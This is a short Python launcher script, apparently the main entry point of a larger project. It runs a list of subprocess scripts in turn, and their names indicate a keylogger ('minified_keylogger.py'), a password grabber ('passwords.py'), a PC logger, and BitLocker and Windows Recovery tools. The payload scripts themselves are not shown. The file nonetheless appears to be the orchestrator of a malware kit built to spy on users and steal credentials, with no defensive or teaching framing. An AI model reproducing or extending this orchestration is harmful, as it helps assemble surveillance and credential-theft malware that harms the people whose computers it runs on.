import subprocess
import os
import sys

# ==============================================================================
# CONFIGURATION
# Add your scripts to this list. Paths are relative to this main.py file.
# ==============================================================================
SCRIPTS_TO_RUN = [
    "tools/bitlocker.py",
    "tools/winre.py",
    "modules/pc_logger.py",
    "tools/passwords.py",
    "tools/minified_keylogger.py"
]

def main():
    # Get the folder where this main.py sits (src/)
    base_dir = os.path.dirname(os.path.abspath(__file__))

    print("==========================================")
    print("      MASTER EXECUTION STARTED")
    print("==========================================\n")

    for script_name in SCRIPTS_TO_RUN:
        # Build the full path to the script
        script_path = os.path.join(base_dir, script_name)

        print(f"--- Running: {script_name} ---")

        if os.path.exists(script_path):
            try:
                # subprocess.run ensures the script runs in its own isolated process
                # sys.executable ensures we use the same python.exe running this script
                result = subprocess.run([sys.executable, script_path])
                
                if result.returncode == 0:
                    print(f" [OK] Finished.")
                else:
                    print(f" [!] Finished with errors (Exit Code: {result.returncode})")
            except Exception as e:
                print(f" [CRITICAL] Failed to launch script: {e}")
        else:
            print(f" [MISSING] File not found: {script_path}")
        
        print("") # Add a blank line between scripts

    print("==========================================")
    print("      ALL OPERATIONS COMPLETE")
    print("==========================================")

if __name__ == "__main__":
    main()
